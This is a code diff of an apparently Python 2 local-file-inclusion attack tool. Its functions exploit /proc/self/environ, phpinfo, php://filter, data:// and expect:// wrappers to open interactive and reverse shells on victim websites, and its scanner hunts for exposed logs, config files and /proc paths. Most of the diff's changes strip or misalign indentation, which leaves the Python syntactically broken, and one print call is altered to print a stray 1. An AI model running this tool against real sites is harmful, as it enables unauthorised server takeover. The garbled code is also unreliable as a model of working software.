@@ -306,6 +306,7 @@ def extractPathFromPaths():
 
 	return tmp
 
+
 def cutURLToLastEqual(url):
 	indexes = SubstrFind(url,"=")
 	return url[0:indexes[len(indexes)-1]+1]
@@ -526,10 +527,10 @@ def hackSE(par):
 
 		whoami = cleanOutput(execSeCmd("whoami"), True)
 		pwd = cleanOutput(execSeCmd("pwd"), True)
-	shell_host = removeHttpFromWebsite(extractWebsiteFromUrl(se_url))
+shell_host = removeHttpFromWebsite(extractWebsiteFromUrl(se_url))
 
-		cmd = ""
-		while(cmd != "exit" and cmd != "quit"):
+cmd = ""
+while(cmd != "exit" and cmd != "quit"):
 			cmd = raw_input("%s@%s:%s$ " %(whoami, shell_host, pwd))
 			if(cmd != "exit" and cmd != "quit"):
 				if(checkIfReverseShell(cmd)):
@@ -538,11 +539,11 @@ def hackSE(par):
 					got = cleanOutput(execSeCmd(correctString(cmd)), False)
 				if("<NOT WORKING>" not in got):
 					print (got)
-		exit()
-	else:
+			exit()
+else:
 		# test in case system() calls have been disabled #
 		#-------------#
-		if("system() has been disabled for security reasons in" in output):
+	if("system() has been disabled for security reasons in" in output):
 			se_phponly = True
 			rand_str = generateRandom()
 			output = execSeCmd("echo %s;" %rand_str)
@@ -572,7 +573,7 @@ def hackSE(par):
 			else:
 				se_fail(par)
 		#-------------#
-		else:
+	else:
 			se_fail(par)
 
 def run_self_environ():
@@ -729,36 +730,36 @@ def run_phpinfo():
 
 	if(len(found) > 0 and rand_str in found):
 	    print (colored("\n[+] The website seems to be vulnerable. Opening a system Shell..","white"))
-	    time.sleep(0.5)
-	    print (colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red"))
+time.sleep(0.5)
+print (colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red"))
 
-	    whoami = isUnknown(cleanOutput(phpinfo_request(headers,"whoami",lfipath,phpinfopath,0,host), True).replace(" ",""))
-	    pwd = isUnknown(cleanOutput(phpinfo_request(headers,"pwd",lfipath,phpinfopath,0,host), True).replace(" ", ""))
+whoami = isUnknown(cleanOutput(phpinfo_request(headers,"whoami",lfipath,phpinfopath,0,host), True).replace(" ",""))
+pwd = isUnknown(cleanOutput(phpinfo_request(headers,"pwd",lfipath,phpinfopath,0,host), True).replace(" ", ""))
 
-	    if(pwd == "?"):
+if(pwd == "?"):
 			path = cleanOutput(phpinfo_request(headers,"path",lfipath,phpinfopath,0,host), True).replace(" ","")
 			if(checkIfWindows(path)):
 				victimOs = "Windows"
 				pwd = cleanOutput(phpinfo_request(headers,"cd",lfipath,phpinfopath,0,host), True).replace(" ","")
 
-	    shell_host = removeHttpFromWebsite(host)
+shell_host = removeHttpFromWebsite(host)
 
-	    while(cmd != "exit" and cmd != "quit"):
+while(cmd != "exit" and cmd != "quit"):
 	    	cmd = raw_input("%s@%s:%s$ " %(whoami,shell_host,pwd))
-	    	if(cmd != "exit" and cmd != "quit"):
-	    		if(checkIfReverseShell(cmd)):
-					phpinfo_reverse = True
-					if(victimOs == "Windows"):
+if(cmd != "exit" and cmd != "quit"):
+	if(checkIfReverseShell(cmd)):
+				phpinfo_reverse = True
+	if(victimOs == "Windows"):
 						windows_phpinfo_reverse_shell(headers,lfipath,phpinfopath,host)
-					else:
-						phpinfo_reverse_shell(headers,lfipath,phpinfopath,host)
-	    		else:
-		    		print (phpinfo_request(headers,cmd,lfipath,phpinfopath,0,host))
-	    exit()
 	else:
-		rand_str = generateRandom()
-		found = phpinfo_request(headers,"php://echo %s" %rand_str,lfipath,phpinfopath,1,host)
-		if(rand_str in found):
+						phpinfo_reverse_shell(headers,lfipath,phpinfopath,host)
+else:
+	print (phpinfo_request(headers,cmd,lfipath,phpinfopath,0,host))
+exit()
+else:
+rand_str = generateRandom()
+found = phpinfo_request(headers,"php://echo %s" %rand_str,lfipath,phpinfopath,1,host)
+if(rand_str in found):
 			print (colored("\n[+] The website seems to be vulnerable. Opening a Shell..","white"))
 			time.sleep(0.5)
 			onlyPhpPrint()
@@ -767,20 +768,20 @@ def run_phpinfo():
 			pwd = isUnknown(cleanOutput(phpinfo_request(headers,"php://getcwd()",lfipath,phpinfopath,0,host), True).replace(" ", ""))
 			shell_host = removeHttpFromWebsite(host)
 
-	    	while(cmd != "exit" and cmd != "quit"):
+while(cmd != "exit" and cmd != "quit"):
 	    		cmd = raw_input("%s@%s:%s$ PHP:// " %(whoami,shell_host,pwd))
-	    		if(cmd != "exit" and cmd != "quit"):
+if(cmd != "exit" and cmd != "quit"):
 	    			print (phpinfo_request(headers,"php://"+cmd,lfipath,phpinfopath,0,host))
-	    	exit()
+exit()
 
 #----------------------------------------------------------------------------------------------------------------------------------------#
 
 #---------------------------------------------------------------PHP://Filter-------------------------------------------------------------#
 def base64_check(c):
     t = ord(c)
-    if((t >= 65 and t <= 90) or (t >= 97 and t <= 122) or (t >= 48 and t <= 57) or (t == 43) or (t == 47) or (t == 61)):
-    	return True;
-    return False;
+if((t>= 65 and t <= 90) or (t >= 97 and t <= 122) or (t >= 48 and t <= 57) or (t == 43) or (t == 47) or (t == 61)):
+			return True;
+			return False;
 
 def phpfilter_extract(content):
 	ftemp = ""
@@ -1345,7 +1346,7 @@ def cleanDataCmd(cmd):
 		else:
 			b64cmd = base64.b64encode(cmd)
 			newcmd += "system(base64_decode('%s'));" %b64cmd
- 	else:
+ 		else:
 		newcmd += cmd[6:]
 
 	newcmd += "?> **"
@@ -1644,19 +1645,19 @@ def scanner():
 	print ("")
 	for line in file(fname):
 	    c = line.strip('\n')
-	    website = owebsite+c
-	    status_code = 500
+website = owebsite+c
+status_code = 500
 
-	    try:
-	    	r = requests.get(website, headers=gen_headers, timeout=7, verify=False)
-	    	content = r.content
-	    	status_code = 200
-	    except:
-	        print ("[!] Problem reaching '%s'.") %website
-	      	content = ""
+try:
+r = requests.get(website, headers=gen_headers, timeout=7, verify=False)
+content = r.content
+status_code = 200
+except:
+print ("[!] Problem reaching '%s'.") %website
+content = ""
 
 	    #content = r.content
-	    if(status_code == 200):
+if(status_code == 200):
 	        if ("[<a href='function.main'>function.main</a>" not in content
 	        	and "[<a href='function.include'>function.include</a>" not in content
 	        	and ("Failed opening" not in content and "for inclusion" not in content)
@@ -1676,31 +1677,31 @@ def scanner():
 	            #print "main() [<a href='function.include'>function.include</a>" not in content
 	            #print "\n------------------------------\n%s\n\n" %content
 
-	            ahpaths.append(website)
+ahpaths.append(website)
 
-	            if("log" in website):
+if("log" in website):
 	            	ahlogs.append(website)
-	            elif("/proc/self/environ" in website):
+elif("/proc/self/environ" in website):
 	            	ahenv.append(website)
-	            elif("/proc/self/fd" in website):
+elif("/proc/self/fd" in website):
 	            	ahfd.append(website)
-	            elif(".cnf" in website or ".conf" in website or ".ini" in website):
+elif(".cnf" in website or ".conf" in website or ".ini" in website):
 	            	ahcnf.append(website)
-	            else:
+else:
 					ahgen.append(website)
-	        else:
-	            print ("[-] '%s' [Not vulnerable]") %website
-	    else:
-	        print ("[!] Problem connecting to the website.\n")
+				else:
+print ("[-] '%s' [Not vulnerable]") %website
+else:
+print ("[!] Problem connecting to the website.\n")
 
-	print (colored("\n[+] Retrieved %s interesting paths.\n" %len(ahpaths),"white"))
-	time.sleep(0.5)
+print (colored("\n[+] Retrieved %s interesting paths.\n" %len(ahpaths),"white"))
+time.sleep(0.5)
 
-	showInterestingPath("Logs",ahlogs)
-	showInterestingPath("/proc/self/environ",ahenv)
-	showInterestingPath("/proc/self/fd",ahfd)
-	showInterestingPath("Configuration", ahcnf)
-	showInterestingPath("Generic",ahgen)
+showInterestingPath("Logs",ahlogs)
+showInterestingPath("/proc/self/environ",ahenv)
+showInterestingPath("/proc/self/fd",ahfd)
+showInterestingPath("Configuration", ahcnf)
+showInterestingPath("Generic",ahgen)
 
 #----------------------------------------------------------------------------------------------------------------------------------------#
 
@@ -1867,23 +1868,23 @@ while(validChoice is False):
 				elif(echoice == "6" or echoice == "f"):
 					printChoice("phpinfo")
 					run_phpinfo()
-				   	print ("\n[!] This website is not vulnerable to the phpinfo injection attack!\n")
-				elif(echoice == "7" or echoice == "g"):
-					printChoice("data:// wrapper")
-					run_data()
-					print ("\n[!] This website is not vulnerable to the data:// injection attack!\n")
-				elif(echoice == "8" or echoice == "h"):
-					printChoice("expect:// wrapper")
-					run_expect()
-					print "\n[!] This website is not vulnerable to the expect:// injection attack!\n"
-				elif(echoice == "9" or echoice == "i"):
-					printChoice("Auto Hack")
-					run_autoHack()
-					print ("\n[!] This website is not vulnerable to any of our attacks!\n")
-				elif(echoice == "10" or echoice == "x"):
-					print ("")
-					validChoice = False
-				else:
-					invalidChoice()
-	else:
-		invalidChoice() 
+print ("\n[!] This website is not vulnerable to the phpinfo injection attack!\n")
+elif(echoice == "7" or echoice == "g"):
+printChoice("data:// wrapper")
+run_data()
+print ("\n[!] This website is not vulnerable to the data:// injection attack!\n")
+elif(echoice == "8" or echoice == "h"):
+printChoice("expect:// wrapper")
+run_expect()
+print ("\n[!] This website is not vulnerable to the expect:// injection attack!\n")
+elif(echoice == "9" or echoice == "i"):
+printChoice("Auto Hack")
+run_autoHack()
+print ("\n[!] This website is not vulnerable to any of our attacks!\n")
+elif(echoice == "10" or echoice == "x"):
+print (1)
+validChoice = False
+else:
+invalidChoice()
+else:
+invalidChoice() 
